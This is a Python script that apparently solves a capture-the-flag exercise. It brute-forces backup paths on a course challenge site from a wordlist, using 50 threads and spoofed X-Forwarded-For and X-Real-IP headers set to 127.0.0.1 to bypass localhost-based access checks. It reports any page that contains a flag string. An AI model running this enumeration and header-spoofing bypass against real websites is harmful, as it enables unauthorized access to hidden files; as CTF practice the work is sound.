import requests
import threading
from concurrent.futures import ThreadPoolExecutor


def quick_scan():
    """Fast targeted scan based on discovered structure"""
    base_url = "https://py10-day6-577570284557.europe-west1.run.app/ex2"

    with open("httpwalk-dict.txt", "r") as f:
        words = [line.strip() for line in f if line.strip()]

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})

    target_paths = [
        "/backup/old/previous",
        "/backup/code/last"
    ]

    found_flags = []
    lock = threading.Lock()

    def check_url(url):
        try:

            headers = {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'}
            resp = session.get(url, timeout=3, headers=headers)

            if resp.status_code == 200:
                content = resp.text.strip()
                with lock:
                    print(f"✅ [200] {url}")
                    if content and len(content) < 500:
                        print(f"   Content: {content}")
                        if any(x in content for x in ['flag{', 'FLAG{', 'ctf{', 'py10{']):
                            print(f"🚩 FLAG FOUND: {content}")
                            found_flags.append(content)
                    return True
        except:
            pass
        return False

    urls_to_check = []

    for path in target_paths:

        for word in words:
            urls_to_check.append(f"{base_url}{path}/{word}.txt")

        flag_names = ['flag.txt', 'secret.txt', 'key.txt', 'answer.txt']
        for flag in flag_names:
            urls_to_check.append(f"{base_url}{path}/{flag}")

    print(f"🎯 Quick scan: {len(urls_to_check)} URLs")
    print("Target paths:", target_paths)

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(check_url, urls_to_check)

    if not found_flags:
        print("❌ No flags in quick scan, trying manual check...")

        likely_candidates = [
            f"{base_url}/backup/old/previous/src.txt",
            f"{base_url}/backup/old/previous/source.txt",
            f"{base_url}/backup/old/previous/static.txt",
            f"{base_url}/backup/old/previous/website.txt",
            f"{base_url}/backup/code/last/src.txt",
            f"{base_url}/backup/code/last/source.txt",
            f"{base_url}/backup/code/last/static.txt",
            f"{base_url}/backup/code/last/website.txt",
        ]

        for url in likely_candidates:
            if check_url(url):
                break

    return found_flags


if __name__ == "__main__":
    flags = quick_scan()
    if flags:
        print(f"\n🎉 Success! Found {len(flags)} flag(s)")
    else:
        print("\n❌ No flags found in quick scan")
